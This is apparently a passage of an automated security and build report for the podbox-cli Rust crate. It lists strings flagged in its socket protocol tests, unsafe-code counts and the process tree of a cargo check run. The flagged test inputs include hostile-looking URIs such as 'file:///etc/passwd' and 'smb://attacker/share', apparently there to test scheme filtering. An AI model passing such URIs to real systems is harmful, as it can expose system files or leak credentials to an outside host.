+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L226" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:226</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L344" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:344</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L392" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:392</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L762" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:762</a> </span></li>
+
+<li><code class="evidence-text">file:///etc/passwd</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L311" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:311</a> </span></li>
+
+<li><code class="evidence-text">smb://attacker/share</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L313" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:313</a> </span></li>
+
+<li><code class="evidence-text">archive://file%3A%2F%2F%2Fhome%2Fuser</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L314" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:314</a> </span></li>
+
+<li><code class="evidence-text">trash:///</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L315" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:315</a> </span></li>
+
+<li><code class="evidence-text">steam://run/1</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L316" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:316</a> </span></li>
+
+<li><code class="evidence-text">vscode://file/etc/passwd</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L317" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:317</a> </span></li>
+
+<li><code class="evidence-text">open:https://example.com</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L350" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:350</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L777" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:777</a> </span></li>
+
+<li><code class="evidence-text">smb://host/share</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/socket_protocol.rs#L376" rel="noreferrer noopener" target="_blank">tests/socket_protocol.rs:376</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">unsafe_code</span> <span class="context">library</span> <span class="count">4</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">1 unsafe blocks, functions or impls</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/commands/runtime/watchdog.rs#L72" rel="noreferrer noopener" target="_blank">src/commands/runtime/watchdog.rs:72</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/process.rs#L289" rel="noreferrer noopener" target="_blank">src/process.rs:289</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host.rs#L209" rel="noreferrer noopener" target="_blank">src/socket_host.rs:209</a> <a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/src/socket_host/handlers.rs#L685" rel="noreferrer noopener" target="_blank">src/socket_host/handlers.rs:685</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">unsafe_code</span> <span class="context">test</span> <span class="count">1</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">5 unsafe blocks, functions or impls</code>
+<span class="places"><a class="place" href="https://crates.io/crates/podbox-cli/0.9.1/code/tests/common/mod.rs#L38" rel="noreferrer noopener" target="_blank">tests/common/mod.rs:38</a> </span></li>
+
+</ul>
+</details>
+
+</div>
+
+
+
+
+<section class="run" id="run-check">
+<div class="run-head">
+  <h2>Run: check</h2>
+  <span class="badge ok">succeeded</span>
+  
+</div>
+
+
+
+
+<dl class="facts">
+<div><dt>Ended</dt><dd>agent reported the end</dd></div><div><dt>Guest</dt><dd>exit code 0</dd></div><div><dt>Run time</dt><dd>1 min 11 s</dd></div><div><dt>VM restore</dt><dd>63 ms</dd></div><div><dt>Payload</dt><dd>11018 files, 379.0 MiB</dd></div><div><dt>Files opened</dt><dd>22465</dd></div>
+</dl>
+
+<div class="panel proc">
+<h3>Processes <span class="muted">376</span></h3>
+
+<p class="hint">Siblings that ran the same program with the same result and the same processes below are folded into one row, with their number.
+<label class="toggle"><input type="checkbox" checked> Hide the 345 compiler processes (rustc, C toolchain)</label></p>
+<div class="scroll">
+<table class="tree">
+<thead><tr><th>Process</th><th>Arguments</th><th>Start</th><th>Took</th><th>Exit</th></tr></thead>
+<tbody>
+
+<tr class="role-cargo">
+<td class="d0"><span class="badge role">cargo</span> <span class="mono" title="pid 572: /usr/local/bin/cargo">/usr/local/bin/cargo</span></td>
+<td class="mono args">check --locked --offline</td>
+<td class="nowrap muted">5 ms</td>
+<td class="nowrap">1 min 11 s</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 579: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="38 similar processes, the first one shown">×38</span></td>
+<td class="mono args">--crate-name build_script_build --edition=2021 /cw/vendor/proc-macro2-1.0.107/build.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type bin --emit=dep-info,link -C embed-bitcode=no --cfg feature=&#34;default&#34; --cfg feature=&#34;proc-macro&#34; --check-cfg cfg(docsrs,test) --check-cfg cfg(feature, values(&#34;default&#34;, &#34;nightly&#34;, &#34;proc-macro&#34;, &#34;span-locations&#34;)) -C metadata=a3dc8fb24392fcd4 -C extra-filename=-a411f7480bd0f42c --out-dir /work/target/debug/build/proc-macro2-a411f7480bd0f42c -L dependency=/work/target/debug/deps --cap-lints allow</td>
+<td class="nowrap muted">361 ms</td>
+<td class="nowrap">725 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-toolchain compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">toolchain</span> <span class="mono" title="pid 586: /usr/bin/cc">/usr/bin/cc</span></td>
+<td class="mono args">-m64 /work/target/debug/build/proc-macro2-a411f7480bd0f42c/rustc14iyOb/symbols.o /work/target/debug/build/proc-macro2-a411f7480bd0f42c/build_script_build-a411f7480bd0f42c.build_script_build.dd8d7f624ad1d48e-cgu.0.rcgu.o /work/target/debug/build/proc-macro2-a411f7480bd0f42c/build_script_build-a411f7480bd0f42c.cnca5igddme2fkrf01fktrtaw.rcgu.o -Wl,--as-needed -Wl,-Bstatic /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libstd-64f5f36fb0927694.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libpanic_unwind-549498e8b2e4d924.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libobject-7ff85ea729a864ff.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libmemchr-0e3477fb2664a277.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libaddr2line-09755979c57b7e64.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libgimli-9a1fede77fbbf2f0.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/libcfg_if-360da4ba13154744.rlib /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib/lib</td>
+<td class="nowrap muted">906 ms</td>
+<td class="nowrap">177 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-toolchain compiler">
+<td class="d3"><span class="branch">└</span><span class="badge role">toolchain</span> <span class="mono" title="pid 587: /usr/libexec/gcc/x86_64-linux-gnu/14/collect2">/usr/libexec/gcc/x86_64-linux-gnu/14/collect2</span></td>
+<td class="mono args">-plugin /usr/libexec/gcc/x86_64-linux-gnu/14/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/14/lto-wrapper -plugin-opt=-fresolution=/tmp/ccjoKB9G.res --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -fuse-ld=lld -o /work/target/debug/build/proc-macro2-a411f7480bd0f42c/build_script_build-a411f7480bd0f42c /usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/14/crtbeginS.o -L/work/target/debug/build/proc-macro2-a411f7480bd0f42c/rustc14iyOb/raw-dylibs -L/usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib -L/usr/local/lib/rustlib/x86_64-unknown-linux-gnu/bin/gcc-ld -L/usr/lib/gcc/x86_64-linux-gnu/14 -L/usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/14/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L</td>
+<td class="nowrap muted">916 ms</td>
+<td class="nowrap">167 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-toolchain compiler">
+<td class="d4"><span class="branch">└</span><span class="badge role">toolchain</span> <span class="mono" title="pid 588: /usr/local/lib/rustlib/x86_64-unknown-linux-gnu/bin/rust-lld">/usr/local/lib/rustlib/x86_64-unknown-linux-gnu/bin/rust-lld</span></td>
+<td class="mono args">-flavor gnu -plugin /usr/libexec/gcc/x86_64-linux-gnu/14/liblto_plugin.so -plugin-opt=/usr/libexec/gcc/x86_64-linux-gnu/14/lto-wrapper -plugin-opt=-fresolution=/tmp/ccjoKB9G.res --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86-64.so.2 -pie -o /work/target/debug/build/proc-macro2-a411f7480bd0f42c/build_script_build-a411f7480bd0f42c /usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu/Scrt1.o /usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/14/crtbeginS.o -L/work/target/debug/build/proc-macro2-a411f7480bd0f42c/rustc14iyOb/raw-dylibs -L/usr/local/lib/rustlib/x86_64-unknown-linux-gnu/lib -L/usr/local/lib/rustlib/x86_64-unknown-linux-gnu/bin/gcc-ld -L/usr/lib/gcc/x86_64-linux-gnu/14 -L/usr/lib/gcc/x86_64-linux-gnu/14/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/14/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_6</td>
+<td class="nowrap muted">918 ms</td>
+<td class="nowrap">163 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 591: /work/target/debug/build/proc-macro2-a411f7480bd0f42c/build-script-build">proc-macro2</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">1.0 s</td>
+<td class="nowrap">88 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 592: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="3 similar processes, the first one shown">×3</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">1.0 s</td>
+<td class="nowrap">8 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 594: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--cfg=procmacro2_build_probe --edition=2021 --crate-name=proc_macro2 --crate-type=lib --cap-lints=allow --emit=dep-info,metadata --out-dir /work/target/debug/build/proc-macro2-ea7d4b35dfd106d0/out/probe src/probe/proc_macro_span.rs --target x86_64-unknown-linux-gnu</td>
+<td class="nowrap muted">1.1 s</td>
+<td class="nowrap">38 ms</td>
+<td class="nowrap">256</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 619: /work/target/debug/build/quote-1c85044effa74c64/build-script-build">quote</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">1.2 s</td>
+<td class="nowrap">9 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 620: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">1.2 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 623: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="165 similar processes, the first one shown">×165</span></td>
+<td class="mono args">--crate-name unicode_ident --edition=2021 /cw/vendor/unicode-ident-1.0.27/src/lib.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type lib --emit=dep-info,metadata,link -C embed-bitcode=no --check-cfg cfg(docsrs,test) --check-cfg cfg(feature, values()) -C metadata=3bb98f7b2f589c61 -C extra-filename=-86dff03eb05ec8a5 --out-dir /work/target/debug/deps -L dependency=/work/target/debug/deps --cap-lints allow</td>
+<td class="nowrap muted">1.3 s</td>
+<td class="nowrap">50 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 686: /work/target/debug/build/serde_core-304eefece1a1291c/build-script-build">serde_core</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">6.1 s</td>
+<td class="nowrap">9 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 687: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">6.1 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 702: /work/target/debug/build/serde-d6689255ae87d4dc/build-script-build">serde</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">6.2 s</td>
+<td class="nowrap">10 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 703: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">6.2 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 748: /work/target/debug/build/libc-bc7a117b66a22265/build-script-build">libc</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">8.6 s</td>
+<td class="nowrap">10 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 749: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">8.6 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 990: /work/target/debug/build/rustix-69a9fc13db064aef/build-script-build">rustix</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">22.0 s</td>
+<td class="nowrap">34 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 991: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="2 similar processes, the first one shown">×2</span></td>
+<td class="mono args">--crate-type=rlib --emit=metadata --target x86_64-unknown-linux-gnu -o /work/target/debug/build/rustix-7af23fadceaa60c2/out/rustix_test_can_compile -</td>
+<td class="nowrap muted">22.0 s</td>
+<td class="nowrap">15 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1000: /work/target/debug/build/crossbeam-utils-8ec454781252f9e1/build-script-build">crossbeam-utils</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">22.1 s</td>
+<td class="nowrap">2 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1283: /work/target/debug/build/icu_properties_data-489780b4c65588d7/build-script-build">icu_properties_data</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">32.2 s</td>
+<td class="nowrap">1 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1285: /work/target/debug/build/icu_normalizer_data-f722c08713ba03b8/build-script-build">icu_normalizer_data</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">32.2 s</td>
+<td class="nowrap">1 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1292: /work/target/debug/build/async-io-339ad837a4463ff2/build-script-build">async-io</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">32.4 s</td>
+<td class="nowrap">23 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1293: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="2 similar processes, the first one shown">×2</span></td>
+<td class="mono args">--version --verbose</td>
+<td class="nowrap muted">32.4 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1313: /work/target/debug/build/generic-array-4cac162ab79b2857/build-script-build">generic-array</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">34.1 s</td>
+<td class="nowrap">10 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1314: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--verbose --version</td>
+<td class="nowrap muted">34.1 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1410: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="5 similar processes, the first one shown">×5</span></td>
+<td class="mono args">--crate-name zvariant --edition=2024 /cw/vendor/zvariant-5.15.1/src/lib.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type lib --emit=dep-info,metadata,link -C embed-bitcode=no --warn=unexpected_cfgs --check-cfg cfg(tokio_unstable) --cfg feature=&#34;default&#34; --cfg feature=&#34;enumflags2&#34; --check-cfg cfg(docsrs,test) --check-cfg cfg(feature, values(&#34;arrayvec&#34;, &#34;camino&#34;, &#34;chrono&#34;, &#34;default&#34;, &#34;enumflags2&#34;, &#34;gvariant&#34;, &#34;heapless&#34;, &#34;option-as-array&#34;, &#34;ostree-tests&#34;, &#34;serde_bytes&#34;, &#34;time&#34;, &#34;url&#34;, &#34;uuid&#34;)) -C metadata=5929a1cf9f000fe0 -C extra-filename=-8fc926f564540c70 --out-dir /work/target/debug/deps -L dependency=/work/target/debug/deps --extern</td>
+<td class="nowrap muted">37.2 s</td>
+<td class="nowrap">1.5 s</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-cargo">
+<td class="d2"><span class="branch">└</span><span class="badge role">cargo</span> <span class="mono" title="pid 1414: /usr/local/bin/cargo">/usr/local/bin/cargo</span></td>
+<td class="mono args">locate-project --workspace --message-format=plain --manifest-path=/cw/vendor/zvariant-5.15.1/Cargo.toml</td>
+<td class="nowrap muted">37.3 s</td>
+<td class="nowrap">12 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1560: /work/target/debug/build/getrandom-18779180ef56a978/build-script-build">getrandom</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">40.7 s</td>
+<td class="nowrap">1 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1562: /work/target/debug/build/zmij-00ef422b5889701d/build-script-build">zmij</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">40.7 s</td>
+<td class="nowrap">8 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1563: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">40.7 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1591: /work/target/debug/build/memoffset-7bfd48076ab8b0dd/build-script-build">memoffset</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">43.1 s</td>
+<td class="nowrap">22 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1592: /usr/local/bin/rustc">/usr/local/bin/rustc</span> <span class="times" title="2 similar processes, the first one shown">×2</span></td>
+<td class="mono args">--version --verbose</td>
+<td class="nowrap muted">43.1 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1712: /work/target/debug/build/serde_json-8bdb9b394c8b5974/build-script-build">serde_json</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">45.7 s</td>
+<td class="nowrap">1 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1724: /work/target/debug/build/thiserror-be99f9d731e5da91/build-script-build">thiserror</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">47.0 s</td>
+<td class="nowrap">25 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1725: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--edition=2018 --crate-name=thiserror --crate-type=lib --cap-lints=allow --emit=dep-info,metadata --out-dir /work/target/debug/build/thiserror-bf0fafdea055103f/out/probe build/probe.rs --target x86_64-unknown-linux-gnu</td>
+<td class="nowrap muted">47.0 s</td>
+<td class="nowrap">21 ms</td>
+<td class="nowrap">256</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1735: /work/target/debug/build/signal-hook-a37e593db9313ff1/build-script-build">signal-hook</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">47.4 s</td>
+<td class="nowrap">1 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1737: /work/target/debug/build/rustix-c73ebbfa015263e8/build-script-build">rustix</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">47.4 s</td>
+<td class="nowrap">20 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 1738: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--crate-type=rlib --emit=metadata --target x86_64-unknown-linux-gnu -o - -</td>
+<td class="nowrap muted">47.4 s</td>
+<td class="nowrap">16 ms</td>
+<td class="nowrap">256</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 1790: /work/target/debug/build/nix-a4ee50166e7950ed/build-script-build">nix</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">49.3 s</td>
+<td class="nowrap">2 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 2019: /work/target/debug/build/thiserror-da16b046c26d58d9/build-script-build">thiserror</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">55.6 s</td>
+<td class="nowrap">26 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 2020: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--edition=2018 --crate-name=thiserror --crate-type=lib --cap-lints=allow --emit=dep-info,metadata --out-dir /work/target/debug/build/thiserror-2a2ace9117c7add0/out/probe build/probe.rs --target x86_64-unknown-linux-gnu</td>
+<td class="nowrap muted">55.6 s</td>
+<td class="nowrap">15 ms</td>
+<td class="nowrap">256</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 2024: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">55.6 s</td>
+<td class="nowrap">7 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 2027: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--crate-name zbus --edition=2024 /cw/vendor/zbus-5.19.0/src/lib.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type lib --emit=dep-info,metadata -C embed-bitcode=no -C debuginfo=2 --warn=unexpected_cfgs --check-cfg cfg(tokio_unstable) --cfg feature=&#34;async-executor&#34; --cfg feature=&#34;async-fs&#34; --cfg feature=&#34;async-io&#34; --cfg feature=&#34;async-lock&#34; --cfg feature=&#34;async-process&#34; --cfg feature=&#34;async-task&#34; --cfg feature=&#34;blocking&#34; --check-cfg</td>
+<td class="nowrap muted">55.6 s</td>
+<td class="nowrap">3.1 s</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-cargo">
+<td class="d2"><span class="branch">└</span><span class="badge role">cargo</span> <span class="mono" title="pid 2031: /usr/local/bin/cargo">/usr/local/bin/cargo</span> <span class="times" title="2 similar processes, the first one shown">×2</span></td>
+<td class="mono args">locate-project --workspace --message-format=plain --manifest-path=/cw/vendor/zbus-5.19.0/Cargo.toml</td>
+<td class="nowrap muted">55.7 s</td>
+<td class="nowrap">12 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-build_script">
+<td class="d1"><span class="branch">└</span><span class="badge role">build_script</span> <span class="mono" title="pid 2054: /work/target/debug/build/anyhow-02472fc0cb68ba3c/build-script-build">anyhow</span></td>
+<td class="mono args"></td>
+<td class="nowrap muted">1 min 0 s</td>
+<td class="nowrap">31 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 2055: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--cfg=anyhow_build_probe --edition=2018 --crate-name=anyhow --crate-type=lib --cap-lints=allow --emit=dep-info,metadata --out-dir /work/target/debug/build/anyhow-16c5e2ddec703063/out/probe src/nightly.rs --target x86_64-unknown-linux-gnu</td>
+<td class="nowrap muted">1 min 0 s</td>
+<td class="nowrap">21 ms</td>
+<td class="nowrap">256</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d2"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 2059: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--version</td>
+<td class="nowrap muted">1 min 1 s</td>
